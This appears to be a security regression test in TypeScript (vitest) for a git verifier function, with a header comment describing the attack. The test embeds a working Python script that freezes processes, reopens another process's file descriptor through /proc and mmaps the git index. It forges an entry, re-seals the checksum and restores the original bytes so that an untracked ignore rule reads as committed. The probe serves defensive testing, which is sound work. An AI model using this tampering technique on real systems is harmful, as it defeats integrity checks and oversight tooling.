/*
RFC-1616 round-34 independent adversarial probe — candidate commit
0245bf867, exported tree.

CX-r34-C — `unprovenIgnoredPaths` (:5535) holds ONE armed window
across its claims-fd children: `check-ignore -v -z --stdin`, then
`diff --name-only -z HEAD`. The window's guards on the claims fd
are (a) `fsWatch("/proc/self/fd/<claims.fd>")` (evidenceWindowFiles
:3584 → arm :3798) — fires on write(2)/pwrite only, and (b) the
`claimsFdPin` settle byte+size compare (:3846-3858) — sees only the
bytes as they stand at settle. No fstat ctime pin exists on the fd
(verified: an mmap store bumps the in-memory inode ctime, so one
WOULD catch this).

`diff --name-only HEAD` is the guard the design leans on to refuse
STAGED-but-uncommitted `.gitignore` provenance (CX-r31-A: "the
claims index is the staged set, and `git add .gitignore` would make
staged foreign bytes read as 'tracked+clean' — the baseline is the
COMMITTED tree"). Attack it with the inotify-blind primitive:

  1. Pre-stage `x/.gitignore` into the real index (same-UID repo —
     `update-index --add --cacheinfo` is attacker reach); its worktree
     file carries "hidden\n". At `prepareEvidenceIndex` mint the real
     `ls-files --stage` already enumerates it → `names` carries it →
     `armedSrc`/`trackedSet` admit it (existsSync passes on the real
     worktree file) → the armed window pins its worktree inode (never
     touched again).
  2. `check-ignore -v` cites `x/.gitignore` for the `x/hidden`
     payload — untracked rule files DO apply; trackedSet.has passes.
  3. The hijacker freezes the `diff` child pre-index-read, opens
     `/proc/<vpid>/fd/N` O_RDWR, mmap()s the claims fd MAP_SHARED,
     rewrites the `x/.gitignore` ENTRY in place — name `x/.gitignore`
     (12 chars) → `committed-12` (12 chars, a HEAD-committed file),
     oid → committed-12's HEAD blob, sha1 trailer re-sealed — same
     size, no write(2) → ZERO inotify events. SIGCONTs it.
  4. `diff --name-only HEAD` on the forged claims image:
     `committed-12` index-oid == HEAD blob (clean, duplicated name or
     not), `x/.gitignore` absent → untracked → never in a HEAD diff →
     `dirtySrc` stays empty → the cite counts tracked+clean.
  5. On child exit the hijacker freezes the verifier, restores the
     original claims bytes through the same mapping, unfreezes —
     `claimsFdPin`'s byte compare attests the minted image and no
     armed event exists → `x/hidden` is PROVEN ignored → the
     returned Set omits it → forged `!!` provenance attesting a
     merely-STAGED (never committed) rule source.

Honest outcomes: refused = `null`; honest = Set containing
"x/hidden"; forged = returned Set WITHOUT "x/hidden".

Fix: the claims fd is `fchmod`ed `0400` at mint — the O_RDWR
`/proc/<vpid>/fd` open the flip needs is EACCES; the `chmodat` reopen
escape bumps ctime into the `claimsFdPin` settle check.
*/

import { execFileSync, spawn, spawnSync } from "node:child_process";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";

import { unprovenIgnoredPaths } from "../../../src/utils/verifier-git.ts";

const tmpdirs: string[] = [];
afterEach(() => {
  while (tmpdirs.length > 0) rmSync(tmpdirs.pop()!, { recursive: true, force: true });
});

const git = (root: string, args: string[], input?: string) =>
  execFileSync("git", ["-C", root, ...args], { encoding: "utf8", input }).trim();

const HAS_PY = spawnSync("python3", ["--version"]).status === 0;

/**
 * Freeze the `diff --name-only -z HEAD` claims child on first /proc
 * sight, mmap the claims fd MAP_SHARED, rewrite `x/.gitignore` →
 * `committed-12`@decoy-oid in place (same size — zero inotify
 * events), release the child, restore on its exit while the
 * verifier is frozen.
 */
const startDiffFlip = (vpid: number, decoyOidHex: string, secs = 60, logPath?: string) => {
  const script =
    "import os,sys,time,struct,hashlib,mmap\n" +
    "vpid=int(sys.argv[1]); mark=b'x/.gitignore'; repl=b'committed-12'; doid=bytes.fromhex(sys.argv[2]); end=time.time()+float(sys.argv[3]); log=open(sys.argv[4],'a')\n" +
    "me=str(os.getpid()); flipped=False; restored=False; orig=None; tm=None; t0=time.time()\n" +
    "def lg(m): log.write('%.1f %s\\n'%((time.time()-t0)*1000,m)); log.flush()\n" +
    "def kids():\n" +
    "    out=[]\n" +
    "    try:\n" +
    "        for t in os.listdir('/proc/%s/task'%vpid):\n" +
    "            try: out += open('/proc/%s/task/%s/children'%(vpid,t)).read().split()\n" +
    "            except: pass\n" +
    "    except: pass\n" +
    "    return out\n" +
    "def argv(k):\n" +
    "    try: return open('/proc/%s/cmdline'%k,'rb').read().split(b'\\0')\n" +
    "    except: return []\n" +
    "def rewrite(body):\n" +
    "    n=struct.unpack('>I',body[8:12])[0]; off=12\n" +
    "    for i in range(n):\n" +
    "        nlen=struct.unpack('>H',body[off+60:off+62])[0]&0xFFF\n" +
    "        name=body[off+62:off+62+nlen]\n" +
    "        if name==mark and len(repl)==nlen:\n" +
    "            b=bytearray(body)\n" +
    "            b[off+40:off+60]=doid\n" +
    "            b[off+62:off+62+nlen]=repl\n" +
    "            body=bytes(b)\n" +
    "            return body[:-20]+hashlib.sha1(body[:-20]).digest()\n" +
    "        off+=(62+nlen+8)//8*8\n" +
    "    return body\n" +
    "def findfd():\n" +
    "    try: names=os.listdir('/proc/%s/fd'%vpid)\n" +
    "    except: return None\n" +
    "    for n in names:\n" +
    "        try:\n" +
    "            if '(deleted)' not in os.readlink('/proc/%s/fd/%s'%(vpid,n)): continue\n" +
    "            os.chmod('/proc/%s/fd/%s'%(vpid,n),0o600)\n" +
    "            f=os.open('/proc/%s/fd/%s'%(vpid,n), os.O_RDWR)\n" +
    "        except: continue\n" +
    "        try:\n" +
    "            if os.pread(f,4,0)!=b'DIRC': os.close(f); continue\n" +
    "            sz=os.fstat(f).st_size\n" +
    "            if mark in os.pread(f,sz,0): return f\n" +
    "            os.close(f)\n" +
    "        except: continue\n" +
    "    return None\n" +
    "while time.time()<end and not restored:\n" +
    "    for k in kids():\n" +
    "        if k==me: continue\n" +
    "        av=argv(k)\n" +
    "        if b'diff' in av and b'HEAD' in av:\n" +
    "            try: os.kill(int(k),19)\n" +
    "            except: continue\n" +
    "            try: os.kill(vpid,19)\n" +
    "            except: pass\n" +
    "            f=findfd()\n" +
    "            if f is not None:\n" +
    "                try:\n" +
    "                    sz=os.fstat(f).st_size\n" +
    "                    m=mmap.mmap(f,sz)\n" +
    "                    orig=m[:]\n" +
    "                    img=rewrite(orig)\n" +
    "                    m[:]=img\n" +
    "                    tm=(f,m); flipped=True; lg('flipped child=%s sz=%d'%(k,sz))\n" +
    "                except Exception as e:\n" +
    "                    lg('fliperr %s'%e)\n" +
    "                    try: os.close(f)\n" +
    "                    except: pass\n" +
    "            try: os.kill(int(k),18)\n" +
    "            except: pass\n" +
    "            if flipped:\n" +
    "                for _ in range(120000):\n" +
    "                    try:\n" +
    "                        stt=open('/proc/%s/stat'%k).read().rsplit(')',1)[1].split()[0]\n" +
    "                        if stt=='Z': break\n" +
    "                    except: break\n" +
    "                    time.sleep(0.00005)\n" +
    "                try: os.kill(vpid,19)\n" +
    "                except: pass\n" +
    "                try:\n" +
    "                    tm[1][:]=orig\n" +
    "                    restored=True; lg('restored')\n" +
    "                except Exception as e: lg('restoreerr %s'%e)\n" +
    "                try: os.kill(vpid,18)\n" +
    "                except: pass\n" +
    "            else:\n" +
    "                try: os.kill(vpid,18)\n" +
    "                except: pass\n" +
    "            break\n" +
    "    time.sleep(0.00002)\n" +
    "lg('exit flipped=%s restored=%s'%(flipped,restored))\n";
  const child = spawn(
    "python3",
    ["-c", script, String(vpid), decoyOidHex, String(secs), logPath ?? "/tmp/cx34c-trace.txt"],
    { stdio: "ignore" },
  );
  child.unref();
  return {
    stop: () => {
      try {
        child.kill("SIGKILL");
      } catch {
        /* done */
      }
    },
  };
};

describe("CX-r34-C: mmap flip→restore on the claims fd hides the STAGED .gitignore from `diff HEAD` — unprovenIgnoredPaths returns proven", () => {
  it(
    "staged `x/.gitignore` hidden from diff — `x/hidden` omitted from the unproven set (forged `!!` provenance)",
    { timeout: 300_000 },
    async (ctx) => {
      if (!HAS_PY) return ctx.skip();
      let forged = 0;
      let refused = 0;
      let honest = 0;
      let lastErr = "";
      for (let attempt = 0; attempt < 30; attempt++) {
        const root = mkdtempSync(path.join(os.tmpdir(), "cx34c-"));
        tmpdirs.push(root);
        execFileSync("git", ["init", "-q", "-b", "main", root]);
        git(root, ["config", "user.email", "t@t"]);
        git(root, ["config", "user.name", "t"]);
        writeFileSync(path.join(root, ".gitignore"), "visible\n");
        writeFileSync(path.join(root, "f.txt"), "v1\n");
        // Decoy: HEAD-committed file, exactly 12 chars like `x/.gitignore`.
        writeFileSync(path.join(root, "committed-12"), "c\n");
        git(root, ["add", ".gitignore", "f.txt", "committed-12"]);
        git(root, ["commit", "-qm", "c1"]);
        // Planted rule source: staged into the real index AND present
        // in the worktree — `names` (minted from `ls-files --stage`)
        // carries it, `armedSrc` existsSync-admits it, `check-ignore`
        // cites it. Its staged blob is NEVER committed to HEAD.
        execFileSync("mkdir", ["-p", path.join(root, "x")]);
        writeFileSync(path.join(root, "x", ".gitignore"), "hidden\n");
        writeFileSync(path.join(root, "x", "hidden"), "x\n");
        writeFileSync(path.join(root, "visible"), "y\n");
        const plantedBlob = git(root, ["hash-object", "-w", "--stdin"], "hidden\n");
        git(root, ["update-index", "--add", "--cacheinfo", `100644,${plantedBlob},x/.gitignore`]);
        const decoyOid = git(root, ["rev-parse", "HEAD:committed-12"]);
        const log = `/tmp/cx34c-trace-${attempt}.txt`;
        const hijack = startDiffFlip(process.pid, decoyOid, 60, log);
        try {
          const r = await unprovenIgnoredPaths(root, ["x/hidden"]);
          if (r === null) {
            refused++;
          } else if (!r.has("x/hidden")) {
            forged++;
          } else {
            honest++;
          }
        } catch (e) {
          lastErr = String(e).slice(0, 140);
          refused++;
        } finally {
          hijack.stop();
        }
      }
      console.log(
        `claims-fd mmap flip on diff HEAD (unprovenIgnoredPaths): forged=${forged} refused=${refused} honest=${honest} last=${lastErr}`,
      );
      expect(forged).toBe(0);
    },
  );
});
